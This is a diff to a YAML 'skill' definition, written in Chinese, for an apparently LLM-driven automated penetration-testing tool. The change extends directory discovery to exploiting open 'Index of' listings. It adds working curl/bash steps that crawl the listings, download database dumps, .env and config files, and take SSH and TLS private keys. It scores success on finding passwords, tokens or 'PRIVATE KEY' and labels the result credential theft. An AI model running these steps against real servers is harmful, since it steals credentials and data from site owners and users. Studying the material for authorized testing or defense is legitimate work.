@@ -1,12 +1,15 @@
 skill_id: directory_discovery
-name: "Web 目录/路径发现"
+name: "Web 目录/路径发现与目录列表利用"
 category: server_misconfig
-version: "1.0"
+version: "2.0"
 
 principle: |
   递归扫描 Web 目录，发现隐藏的管理后台、配置文件、备份文件、
-  信息泄露端点。工具链: feroxbuster(快速递归) → dirsearch(全面) → gobuster。
-  重点关注: 管理后台、.git/.env/.bak、phpinfo、目录遍历。
+  信息泄露端点。当发现 Apache/Nginx "Index of" 目录列表页时，
+  递归爬取其中的文件和子目录，重点提取有价值的文件。
+  工具链: feroxbuster(快速递归) → dirsearch(全面) → gobuster。
+  重点关注: 管理后台、.git/.env/.bak、phpinfo、目录遍历、
+  源码文件、配置文件、数据库dump、密钥文件。
 
 match:
   rules:
@@ -16,6 +19,11 @@ match:
     - evidence_contains: ["directory listing"]
     - evidence_contains: ["目录遍历"]
     - evidence_contains: ["directory traversal"]
+    - evidence_contains: ["index of"]
+    - evidence_contains: ["information disclosure"]
+    - evidence_contains: ["sensitive file"]
+    - evidence_contains: ["敏感路径"]
+    - evidence_contains: ["敏感文件"]
 
 probes:
   - id: quick_dir_scan
@@ -66,6 +74,48 @@ probes:
       - if_contains: [".git/HEAD"]
         set: { git_exposed: true }
 
+  - id: crawl_directory_listings
+    description: "检测并爬取 Index of 目录列表页"
+    command: |
+      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+      echo "=== Directory Listing Crawl ==="
+      for dir in / /files/ /uploads/ /backup/ /data/ /download/ /public/ /static/ /images/ /docs/; do
+        BODY=$(curl -sS -L --max-time 8 "$BASE$dir" 2>/dev/null)
+        if echo "$BODY" | grep -qi "Index of\|Parent Directory\|<title>Index of"; then
+          echo "DIRLIST_FOUND:$dir"
+          echo "$BODY" | grep -oP 'href="\K[^"]+' | head -30 | while read -r link; do
+            case "$link" in
+              ../*|?*|#*|javascript:*|mailto:*) continue ;;
+            esac
+            echo "  ENTRY:$dir$link"
+          done
+          for sub in $(echo "$BODY" | grep -oP 'href="\K[^"]+/' | head -10); do
+            case "$sub" in
+              ../*) continue ;;
+            esac
+            SUBBODY=$(curl -sS -L --max-time 5 "$BASE$dir$sub" 2>/dev/null)
+            if echo "$SUBBODY" | grep -qi "Index of\|Parent Directory"; then
+              echo "  SUBDIR:$dir$sub"
+              echo "$SUBBODY" | grep -oP 'href="\K[^"]+' | head -20 | while read -r sublink; do
+                case "$sublink" in
+                  ../*|?*|#*) continue ;;
+                esac
+                echo "    SUBENTRY:$dir$sub$sublink"
+              done
+            fi
+          done
+        fi
+      done
+      echo "DIRLIST_CRAWL_DONE"
+    timeout: 120
+    parse_rules:
+      - if_contains: ["DIRLIST_FOUND"]
+        set: { directory_listing: true }
+      - if_regex: "ENTRY:.*\\.(sql|db|sqlite|bak|backup|zip|tar|gz|key|pem|conf|env|log|php|py|sh)"
+        set: { interesting_files: true }
+      - if_regex: "ENTRY:.*\\.(key|pem|id_rsa|ppk|p12)"
+        set: { credential_files: true }
+
 exploit_paths:
   - path_id: git_dump
     name: ".git 源码泄露利用"
@@ -79,7 +129,6 @@ exploit_paths:
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
           echo "=== Git Dump ==="
           cd /tmp && rm -rf git_dump
-          # 尝试读取关键 git 文件
           for f in HEAD config refs/heads/master objects/info/packs; do
             echo "--- $f ---"
             curl -s "$BASE/.git/$f" --max-time 5 2>/dev/null | head -5
@@ -114,6 +163,68 @@ exploit_paths:
         evidence_capture:
           shell_type: "info_disclosure"
 
+  - path_id: dirlist_interesting_files
+    name: "目录列表中的有价值文件下载"
+    priority: 3
+    conditions:
+      interesting_files: true
+    steps:
+      - id: download_interesting
+        description: "下载目录列表中发现的敏感文件"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== Downloading Interesting Files ==="
+          for ext in sql db sqlite bak backup conf env log key pem; do
+            for dir in / /files/ /uploads/ /backup/ /data/; do
+              BODY=$(curl -sS -L --max-time 5 "$BASE$dir" 2>/dev/null)
+              FILES=$(echo "$BODY" | grep -oP "href=\"\K[^\"]+\.$ext" | head -3)
+              for f in $FILES; do
+                echo "--- $dir$f ---"
+                curl -sS --max-time 10 "$BASE$dir$f" 2>/dev/null | head -50
+                echo ""
+              done
+            done
+          done
+          echo "INTERESTING_DOWNLOAD_DONE"
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["password", "secret", "token", "key", "db_", "mysql", "postgres", "root", "admin", "CREATE TABLE", "INSERT INTO"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "info_disclosure"
+
+  - path_id: dirlist_credential_files
+    name: "目录列表中的密钥/凭据文件"
+    priority: 2
+    conditions:
+      credential_files: true
+    steps:
+      - id: download_creds
+        description: "下载密钥和凭据文件"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== Credential File Download ==="
+          for dir in / /files/ /uploads/ /backup/ /data/ /.ssh/ /keys/; do
+            BODY=$(curl -sS -L --max-time 5 "$BASE$dir" 2>/dev/null)
+            for pattern in id_rsa id_dsa id_ecdsa id_ed25519 "*.pem" "*.key" "*.ppk" "*.p12"; do
+              FILES=$(echo "$BODY" | grep -oiP "href=\"\K[^\"]*($pattern)[^\"]*" | head -3)
+              for f in $FILES; do
+                echo "--- $dir$f ---"
+                curl -sS --max-time 10 "$BASE$dir$f" 2>/dev/null | head -30
+                echo ""
+              done
+            done
+          done
+          echo "CRED_DOWNLOAD_DONE"
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["PRIVATE KEY", "RSA PRIVATE", "ssh-rsa", "PuTTY"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "credential_theft"
+
   - path_id: llm_freeform
     name: "LLM 自由推理"
     priority: 99
@@ -122,6 +233,7 @@ exploit_paths:
 
 remediation: |
   1. 删除或限制访问 .git、.env 等敏感文件
-  2. 配置 Web 服务器禁止目录列表
+  2. 配置 Web 服务器禁止目录列表（autoindex off）
   3. 移除备份文件和调试端点
   4. 使用 .htaccess 或 nginx deny 规则保护敏感路径
+  5. 敏感密钥文件不应放在 Web 可访问目录
